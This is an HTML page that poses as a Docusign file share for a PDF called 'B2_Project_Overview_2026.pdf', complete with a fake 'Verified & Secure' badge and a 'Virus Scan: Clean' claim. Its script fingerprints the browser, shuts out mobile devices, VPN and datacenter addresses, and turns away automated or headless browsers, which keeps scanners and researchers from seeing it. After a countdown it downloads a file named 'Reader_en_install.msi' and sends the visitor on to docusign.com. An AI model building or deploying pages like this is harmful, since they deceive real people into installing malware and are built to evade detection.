<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Your Secure Document | CorporateShare</title>
    <link rel="icon" type="image/x-icon" href="https://www.docusign.com/assets/images/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2563eb;
            --primary-dark: #1d4ed8;
            --text: #1f2937;
            --text-light: #6b7280;
            --background: #f9fafb;
            --card-bg: #ffffff;
            --border-radius: 8px;
            --success: #10b981;
            --warning: #f59e0b;
        }
        
        body {
            font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
            background-color: var(--background);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text);
            line-height: 1.5;
        }
        
        .container {
            background-color: var(--card-bg);
            border-radius: var(--border-radius);
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
            width: 90%;
            max-width: 520px;
            padding: 40px;
            text-align: center;
            border: 1px solid #e5e7eb;
        }
        
        .logo {
            height: 32px;
            margin-bottom: 28px;
        }
        
        h1 {
            color: var(--text);
            margin-bottom: 12px;
            font-size: 1.5rem;
            font-weight: 700;
        }
        
        .description {
            color: var(--text-light);
            margin-bottom: 24px;
            font-size: 0.95rem;
            max-width: 380px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .file-card {
            background-color: #f8fafc;
            border-radius: var(--border-radius);
            padding: 20px;
            margin: 28px 0;
            text-align: left;
            display: flex;
            align-items: center;
            border: 1px solid #e2e8f0;
            position: relative;
        }
        
        .file-icon {
            font-size: 2rem;
            color: #e63946;
            margin-right: 16px;
            flex-shrink: 0;
        }
        
        .file-details {
            overflow: hidden;
        }
        
        .file-name {
            font-weight: 600;
            margin-bottom: 6px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .file-meta {
            color: var(--text-light);
            font-size: 0.85rem;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        
        .security-badge {
            position: absolute;
            top: -10px;
            right: 16px;
            background-color: var(--success);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .download-btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: var(--border-radius);
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .download-btn:hover {
            background-color: var(--primary-dark);
        }
        
        .countdown {
            margin-top: 20px;
            font-size: 0.85rem;
            color: var(--text-light);
        }
        
        .manual-download {
            margin-top: 24px;
            font-size: 0.85rem;
            color: var(--text-light);
        }
        
        .manual-download a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }
        
        .review-section {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #e5e7eb;
            font-size: 0.85rem;
            color: var(--text-light);
        }
        
        .review-section a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
            }
            
            .logo {
                height: 28px;
                margin-bottom: 24px;
            }
            
            .file-card {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <h1>Your Document is Ready</h1>
        <p class="description">This secure file has been shared with you via <strong>Docusign</strong>.</p>
        
        <div class="file-card">
            <div class="security-badge">
                <i class="fas fa-shield-alt"></i> Verified & Secure
            </div>
            <div class="file-icon">
                <i class="fas fa-file-pdf"></i>
            </div>
            <div class="file-details">
                <div class="file-name">B2_Project_Overview_2026.pdf</div>
                <div class="file-meta">
                    <span><i class="far fa-file"></i> 4.8 MB</span>
                    <span><i class="far fa-clock"></i> Uploaded: Jan 14, 2026</span>
                    <span><i class="fas fa-check-circle"></i> Virus Scan: Clean</span>
                </div>
            </div>
        </div>
        
        <div class="countdown" id="countdown">Secure download starting in 5 seconds...</div>
        <button class="download-btn" id="downloadBtn">
            <i class="fas fa-download"></i> Download Document
        </button>
        
        <div class="manual-download">
            <a href="#" id="manualLink"><i class="fas fa-hand-pointer"></i> Click here if download doesn't start</a>
        </div>
        
        <div class="review-section">
            <i class="fas fa-info-circle"></i> Please review this document and <a href="mailto:contact@abccorp.com?subject=File%20Feedback">get back to us</a> with any questions.
        </div>
    </div>

    <script>
        (async function() {
            const generateFingerprint = () => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Antibot test', 2, 2);
                const canvasFingerprint = canvas.toDataURL();
                
                const screenFingerprint = `${screen.width}x${screen.height}x${screen.colorDepth}`;
                const timezoneFingerprint = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const languageFingerprint = navigator.language;
                const platformFingerprint = navigator.platform;
                const hardwareFingerprint = navigator.hardwareConcurrency || 'unknown';
                const memoryFingerprint = navigator.deviceMemory || 'unknown';
                const vendorFingerprint = navigator.vendor || 'unknown';
                
                const webglFingerprint = (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (!gl) return 'no-webgl';
                        return gl.getParameter(gl.VENDOR) + '|' + gl.getParameter(gl.RENDERER);
                    } catch (e) {
                        return 'error';
                    }
                })();
                
                const audioFingerprint = (() => {
                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        const context = new AudioContext();
                        const oscillator = context.createOscillator();
                        const analyser = context.createAnalyser();
                        const gain = context.createGain();
                        const scriptProcessor = context.createScriptProcessor(256, 1, 1);
                        
                        oscillator.connect(analyser);
                        analyser.connect(scriptProcessor);
                        scriptProcessor.connect(gain);
                        gain.connect(context.destination);
                        
                        oscillator.start(0);
                        const fingerprint = analyser.frequencyBinCount.toString();
                        oscillator.stop();
                        context.close();
                        return fingerprint;
                    } catch (e) {
                        return 'no-audio';
                    }
                })();
                
                return btoa(
                    canvasFingerprint + 
                    screenFingerprint + 
                    timezoneFingerprint + 
                    languageFingerprint + 
                    platformFingerprint +
                    hardwareFingerprint +
                    memoryFingerprint +
                    vendorFingerprint +
                    webglFingerprint +
                    audioFingerprint
                );
            };
            
            function getUserIP() {
                if (!localStorage.getItem('userIP')) {
                    const fingerprint = generateFingerprint();
                    localStorage.setItem('userIP', fingerprint);
                }
            }
            
            function checkIPBlock() {
                const currentIP = localStorage.getItem('userIP') || 'unknown';
                const ipBlocks = JSON.parse(localStorage.getItem('ipBlocks') || '{}');
                
                if (ipBlocks[currentIP] && ipBlocks[currentIP] > Date.now()) {
                    const remainingTime = Math.ceil((ipBlocks[currentIP] - Date.now()) / (60 * 1000));
                    document.body.innerHTML = `
                    <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
                                height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
                                padding: 20px; box-sizing: border-box;">
                        <h1 style="font-size: 24px; margin-bottom: 20px; color: #dc2626">üö´ Access Blocked</h1>
                        <p style="font-size: 18px; margin-bottom: 10px; max-width: 500px; line-height: 1.5;">
                            Your access is temporarily blocked.
                        </p>
                        <p style="font-size: 16px; max-width: 500px; line-height: 1.5;">
                            Try again in ${remainingTime} minutes.
                        </p>
                    </div>`;
                    return true;
                } else if (ipBlocks[currentIP] && ipBlocks[currentIP] <= Date.now()) {
                    delete ipBlocks[currentIP];
                    localStorage.setItem('ipBlocks', JSON.stringify(ipBlocks));
                }
                return false;
            }
            
            getUserIP();
            
            if (checkIPBlock()) {
                return;
            }
            
            const ua = navigator.userAgent;
            
            // Simplified mobile detection - only block actual mobile devices
            const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|webOS|Windows Phone|Tablet|Kindle|Silk|PlayBook|BB10/i.test(ua) || 
                             (typeof window.orientation !== "undefined") || 
                             (navigator.userAgent.includes("Android")) ||
                             (navigator.userAgent.includes("iPhone")) ||
                             (navigator.userAgent.includes("iPad")) ||
                             (navigator.userAgent.includes("iPod")) ||
                             (navigator.platform.includes("iPhone") || navigator.platform.includes("iPad") || navigator.platform.includes("iPod")) ||
                             (navigator.platform.includes("Android")) ||
                             (navigator.platform.includes("WinCE") || navigator.platform.includes("WinMobile") || navigator.platform.includes("Windows Phone")) ||
                             (navigator.connection && navigator.connection.type === 'cellular');
                             
            if (isMobile) {
                document.documentElement.innerHTML = `
                <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
                            height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
                            padding: 20px; box-sizing: border-box;">
                    <h1 style="font-size: 24px; margin-bottom: 20px; color: #E03636">‚ö†Ô∏è Desktop Only</h1>
                    <p style="font-size: 18px; margin-bottom: 10px; max-width: 500px; line-height: 1.5;">
                        Access is only available on a desktop or Windows computer.
                    </p>
                    <p style="font-size: 16px; max-width: 500px; line-height: 1.5;"><center>
                        Please check your email and open the document on a laptop or desktop device.</center>
                    </p> 
                </div>`;
                return;
            }
            
            async function checkVPNAndResidentialIP() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const ipData = await response.json();
                    
                    const isVPN = ipData.privacy.vpn || 
                                   ipData.privacy.proxy || 
                                   ipData.privacy.tor || 
                                   ipData.privacy.hosting ||
                                   ipData.org.includes('VPN') ||
                                   ipData.org.includes('Hosting') ||
                                   ipData.org.includes('Data Center') ||
                                   ipData.org.includes('Cloud') ||
                                   ipData.org.includes('Server') ||
                                   ipData.org.includes('CDN') ||
                                   ipData.org.includes('Colocation') ||
                                   ipData.org.includes('COLO') ||
                                   ipData.org.includes('RDP') ||
                                   ipData.org.includes('Remote') ||
                                   ipData.org.includes('Terminal') ||
                                   ipData.org.includes('KVM') ||
                                   ipData.org.includes('VPS') ||
                                   ipData.org.includes('Dedicated') ||
                                   ipData.org.includes('VDS') ||
                                   ipData.org.includes('Infrastructure') ||
                                   ipData.org.includes('Network') ||
                                   ipData.org.includes('Solutions') ||
                                   ipData.org.includes('Technologies') ||
                                   ipData.org.includes('Systems') ||
                                   ipData.org.includes('Services') ||
                                   ipData.org.includes('Hosting') ||
                                   ipData.org.includes('Datacenter') ||
                                   ipData.org.includes('DC') ||
                                   ipData.asn.type === 'hosting' ||
                                   ipData.type === 'hosting' ||
                                   ipData.isp.includes('Hosting') ||
                                   ipData.isp.includes('Server') ||
                                   ipData.isp.includes('Data Center');
                    
                    const isResidential = !isVPN && 
                                        ipData.type === 'isp' && 
                                        !ipData.privacy.vpn && 
                                        !ipData.privacy.proxy && 
                                        !ipData.privacy.tor && 
                                        !ipData.privacy.hosting &&
                                        !ipData.org.includes('VPN') &&
                                        !ipData.org.includes('Hosting') &&
                                        !ipData.org.includes('Cloud') &&
                                        !ipData.org.includes('Server') &&
                                        !ipData.org.includes('Data Center') &&
                                        !ipData.org.includes('Colocation') &&
                                        !ipData.org.includes('RDP');
                    
                    if (!isResidential) {
                        document.body.innerHTML = `
                        <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
                                    height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
                                    padding: 20px; box-sizing: border-box;">
                            <h1 style="font-size: 24px; margin-bottom: 20px; color: #dc2626">üö´ Access Denied</h1>
                            <p style="font-size: 18px; margin-bottom: 10px; max-width: 500px; line-height: 1.5;">
                                Residential IP Required
                            </p>
                            <p style="font-size: 16px; max-width: 500px; line-height: 1.5;">
                                Access is only allowed from residential IP addresses.
                            </p>
                            <p style="font-size: 14px; color: #666; margin-top: 20px;">
                                Please disable VPN, RDP, proxy, or hosting connections and try again.
                            </p>
                        </div>`;
                        return false;
                    }
                    
                    return true;
                } catch (error) {
                    console.error('IP check failed:', error);
                    return false;
                }
            }
            
            const ipCheckResult = await checkVPNAndResidentialIP();
            if (!ipCheckResult) {
                return;
            }
            
            
            const mathChallenge = () => {
                const a = Math.floor(Math.random() * 50) + 10;
                const b = Math.floor(Math.random() * 50) + 10;
                const operations = ['+', '-', '*'];
                const operation = operations[Math.floor(Math.random() * operations.length)];
                
                let answer;
                switch(operation) {
                    case '+': answer = a + b; break;
                    case '-': answer = a - b; break;
                    case '*': answer = a * b; break;
                }
                
                return { question: `${a} ${operation} ${b}`, answer: answer.toString() };
            };
            
            const challenge = mathChallenge();
            const fingerprint = generateFingerprint();
            
            const botIndicators = [
                navigator.webdriver,
                window.phantom,
                window.callPhantom,
                window._phantom,
                window.__nightmare,
                window.navigator.webdriver,
                
                window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect,
                window.opr && window.opr.addons,
                typeof InstallTrigger !== 'undefined',
                
                window.spawn,
                window.emit,
                window.Buffer,
                process && process.versions && process.versions.node,
                
                window.navigator.plugins.length === 0,
                window.navigator.languages === undefined,
                !window.navigator.permissions,
                
                typeof window.outerHeight !== 'number',
                typeof window.outerWidth !== 'number',
                
                window.document.documentMode,
                window.navigator.msLaunchUri,
                
                window.document.$cdc_asdjflasutopfhvcZLmcfl_,
                
                window.navigator.webdriver === true,
                
                window.navigator._playwright === true,
                
                window.devtools && window.devtools.open,
                
                window.navigator.userAgent.includes('HeadlessChrome'),
                window.navigator.userAgent.includes('PhantomJS'),
                window.navigator.userAgent.includes('SlimerJS'),
                window.navigator.userAgent.includes('HtmlUnit'),
                window.navigator.userAgent.includes('Jsoup'),
                
                !window.performance || !window.performance.now,
                !window.requestAnimationFrame,
                
                (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        return !gl || !gl.getExtension('WEBGL_debug_renderer_info');
                    } catch (e) {
                        return true;
                    }
                })(),
                
                (() => {
                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        return !AudioContext;
                    } catch (e) {
                        return true;
                    }
                })(),
                
                !window.Notification,
                !window.navigator.geolocation,
                !window.navigator.getBattery,
                !window.DeviceOrientationEvent,
                !window.DeviceMotionEvent,
                !('ontouchstart' in window),
                !window.navigator.getGamepads,
                !window.navigator.vr,
                !window.navigator.bluetooth,
                !window.navigator.usb,
                !window.navigator.nfc,
                !window.navigator.share,
                !window.navigator.clipboard,
                !window.screen.orientation,
                !window.navigator.wakeLock,
                !window.navigator.mediaDevices,
                !document.pictureInPictureEnabled,
                !document.fullscreenEnabled,
                !window.PaymentRequest,
                !window.navigator.credentials,
                !window.navigator.authentication,
                !window.navigator.credentials || !window.navigator.credentials.create,
                !window.navigator.serviceWorker,
                !window.caches,
                !window.indexedDB,
                !window.openDatabase,
                !window.resolveLocalFileSystemURL,
                !window.navigator.storage,
                !window.navigator.permissions,
                !window.navigator.mediaSession,
                !window.navigator.presentation,
                !window.navigator.serial,
                !window.navigator.hid,
                !window.navigator.requestMIDIAccess,
                !window.navigator.xr,
                !window.AmbientLightSensor,
                !window.ProximitySensor,
                !window.Magnetometer,
                !window.Accelerometer,
                !window.Gyroscope,
                !window.LinearAccelerationSensor,
                !window.OrientationSensor,
                !window.RelativeOrientationSensor,
                !window.AbsoluteOrientationSensor,
                !window.GravitySensor,
                !window.GeolocationSensor,
                !window.navigator.connection,
                !window.navigator.getBattery,
                !window.navigator.vibrate,
                !window.navigator.wakeLock,
                !window.IdleDetector,
                !window.EyeTracker,
                !window.FaceDetector,
                !window.BarcodeDetector,
                !window.TextDetector,
                !window.ShapeDetector,
                !window.PeriodicSyncManager,
                !window.BackgroundSyncManager,
                !window.BackgroundFetchManager,
                !window.ContentIndex,
                !window.showOpenFilePicker,
                !window.showDirectoryPicker,
                !window.FileSystemFileHandle,
                !window.WebTransport,
                !window.WebSocket,
                !window.Worker,
                !window.SharedWorker,
                !window.ServiceWorker,
                !window.CacheStorage,
                !window.WebAssembly,
                !window.WebGL2RenderingContext,
                !window.GPU,
                !window.NDEFReader,
                !window.HID,
                !window.Serial,
                !window.Bluetooth,
                !window.USB,
                !window.AudioContext,
                !window.SpeechRecognition,
                !window.speechSynthesis,
                !window.crypto,
                !window.crypto.subtle,
                !window.ReadableStream,
                !window.TransformStream,
                !window.WritableStream,
                !window.ByteLengthQueuingStrategy,
                !window.CountQueuingStrategy,
                !window.TextEncoder,
                !window.TextDecoder,
                !window.TextEncoderStream,
                !window.TextDecoderStream,
                !window.CompressionStream,
                !window.DecompressionStream,
                !window.ImageDecoder,
                !window.VideoFrameMetadata,
                !window.VideoFrame,
                !window.MediaCapabilities,
                !window.MediaSession,
                !window.MediaSource,
                !window.SourceBuffer,
                !window.MediaRecorder,
                !window.MediaStream,
                !window.MediaStreamTrack,
                !window.MediaStreamAudioSourceNode,
                !window.MediaStreamAudioDestinationNode,
                !window.MediaStreamTrackAudioSourceNode,
                !window.MediaStreamTrackProcessor,
                !window.MediaStreamTrackGenerator,
                !window.AudioWorklet,
                !window.PaintWorklet,
                !window.AnimationWorklet,
                !window.LayoutWorklet,
                !window.AudioContext,
                !window.OfflineAudioContext,
                !window.AudioNode,
                !window.AudioParam,
                !window.AudioBuffer,
                !window.AudioBufferSourceNode,
                !window.AudioDestinationNode,
                !window.ScriptProcessorNode,
                !window.AnalyserNode,
                !window.GainNode,
                !window.BiquadFilterNode,
                !window.WaveShaperNode,
                !window.DelayNode,
                !window.PannerNode,
                !window.ConvolverNode,
                !window.ChannelSplitterNode,
                !window.ChannelMergerNode,
                !window.DynamicsCompressorNode,
                !window.StereoPannerNode,
                !window.OscillatorNode,
                !window.ConstantSourceNode,
                !window.AudioListener
            ];
            
            const isBot = botIndicators.some(indicator => indicator);
            
            let suspiciousScore = 0;
            
            let hasMouseMovement = false;
            let hasKeyboardInteraction = false;
            
            document.addEventListener('mousemove', () => hasMouseMovement = true, { once: true });
            document.addEventListener('keydown', () => hasKeyboardInteraction = true, { once: true });
            
            const loadTime = performance.now();
            if (loadTime < 100) suspiciousScore += 2;
            
            if (!window.localStorage) suspiciousScore += 1;
            if (!window.sessionStorage) suspiciousScore += 1;
            if (!window.indexedDB) suspiciousScore += 1;
            
            const finalBotScore = isBot ? 10 : suspiciousScore;
            
            if (finalBotScore >= 3) {
                // Create math challenge verification
                const mathChallenge = mathChallenge();
                const challengeHtml = `
                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:flex; align-items:center; justify-content:center; z-index:9999;">
                    <div style="background:white; padding:40px; border-radius:12px; text-align:center; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.3);">
                        <h2 style="color:#333; margin-bottom:20px; font-family:Arial, sans-serif;">üîí Security Verification</h2>
                        <p style="color:#666; margin-bottom:25px; font-family:Arial, sans-serif;">Please solve this math problem to continue:</p>
                        <div style="font-size:24px; font-weight:bold; color:#2563eb; margin-bottom:20px; font-family:Arial, sans-serif;">${mathChallenge.question} = ?</div>
                        <input type="number" id="mathAnswer" placeholder="Enter your answer" style="width:100%; padding:12px; border:2px solid #e5e7eb; border-radius:6px; font-size:16px; margin-bottom:20px; box-sizing:border-box;">
                        <button onclick="verifyMathAnswer('${mathChallenge.answer}')" style="background:#2563eb; color:white; border:none; padding:12px 30px; border-radius:6px; font-size:16px; cursor:pointer; font-weight:600; transition:background 0.3s;">Verify</button>
                        <p style="color:#999; font-size:12px; margin-top:20px; font-family:Arial, sans-serif;">This helps us protect against automated bots</p>
                    </div>
                </div>`;
                document.body.innerHTML = challengeHtml;
                return;
            }
            
            // Store challenge data for verification
            sessionStorage.setItem('mathChallenge', JSON.stringify(challenge));
            sessionStorage.setItem('fingerprint', fingerprint);
        })();
        
        function verifyMathAnswer(correctAnswer) {
            const userAnswer = document.getElementById('mathAnswer').value;
            const currentIP = localStorage.getItem('userIP') || 'unknown';
            
            let failedAttempts = JSON.parse(localStorage.getItem('failedAttempts') || '{}');
            const currentAttempts = failedAttempts[currentIP] || 0;
            
            if (userAnswer === correctAnswer) {
                delete failedAttempts[currentIP];
                localStorage.setItem('failedAttempts', JSON.stringify(failedAttempts));
                location.reload();
            } else {
                failedAttempts[currentIP] = currentAttempts + 1;
                localStorage.setItem('failedAttempts', JSON.stringify(failedAttempts));
                
                if (failedAttempts[currentIP] >= 5) {
                    const blockUntil = Date.now() + (60 * 60 * 1000);
                    const ipBlocks = JSON.parse(localStorage.getItem('ipBlocks') || '{}');
                    ipBlocks[currentIP] = blockUntil;
                    localStorage.setItem('ipBlocks', JSON.stringify(ipBlocks));
                    
                    document.body.innerHTML = `
                    <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
                                height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
                                padding: 20px; box-sizing: border-box;">
                        <h1 style="font-size: 24px; margin-bottom: 20px; color: #dc2626">üö´ Access Blocked</h1>
                        <p style="font-size: 18px; margin-bottom: 10px; max-width: 500px; line-height: 1.5;">
                            Too many failed verification attempts.
                        </p>
                        <p style="font-size: 16px; max-width: 500px; line-height: 1.5;">
                            Your access has been temporarily blocked for 1 hour.
                        </p>
                        <p style="font-size: 14px; color: #666; margin-top: 20px;">
                            Please try again later.
                        </p>
                    </div>`;
                    return;
                } else {
                    const input = document.getElementById('mathAnswer');
                    const remainingAttempts = 5 - failedAttempts[currentIP];
                    input.style.borderColor = '#ef4444';
                    input.placeholder = `Incorrect! ${remainingAttempts} attempts remaining.`;
                    input.value = '';
                    setTimeout(() => {
                        input.style.borderColor = '#e5e7eb';
                        input.placeholder = 'Enter your answer';
                    }, 2000);
                }
            }
        }
        
        let countdown = 5;
        const countdownElement = document.getElementById('countdown');
        const downloadBtn = document.getElementById('downloadBtn');
        const manualLink = document.getElementById('manualLink');
        
        function updateCountdown() {
            countdownElement.textContent = countdown > 0 
                ? `Secure download starting in ${countdown} seconds...` 
                : "Initiating secure download...";
        }
        
        updateCountdown();
        
        const countdownInterval = setInterval(() => {
            countdown--;
            updateCountdown();
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                initiateSecureDownload();
            }
        }, 1000);
        
        function initiateSecureDownload() {
            downloadBtn.innerHTML = '<i class="fas fa-lock"></i> Securing connection...';
            downloadBtn.disabled = true;
            
            setTimeout(() => {
                downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading securely...';
                
                setTimeout(() => {
                    // Use fetch and blob to trigger download without showing download.php
                    fetch('download.php?download=1')
                        .then(response => response.blob())
                        .then(blob => {
                            const url = window.URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'Reader_en_install.msi';
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                            window.URL.revokeObjectURL(url);
                            
                            // Redirect to docusign.com after download
                            setTimeout(() => {
                                window.location.href = 'https://www.docusign.com/';
                            }, 2000);
                        })
                        .catch(error => {
                            console.error('Download failed:', error);
                            // Fallback to direct navigation
                            window.location.href = 'download.php';
                        });
                }, 1000);
            }, 800);
        }
        
        downloadBtn.addEventListener('click', (e) => {
            e.preventDefault();
            clearInterval(countdownInterval);
            initiateSecureDownload();
        });
        
        manualLink.addEventListener('click', (e) => {
            e.preventDefault();
            clearInterval(countdownInterval);
            countdownElement.textContent = "Preparing secure manual download...";
            initiateSecureDownload();
        });
    </script>
</body>
</html>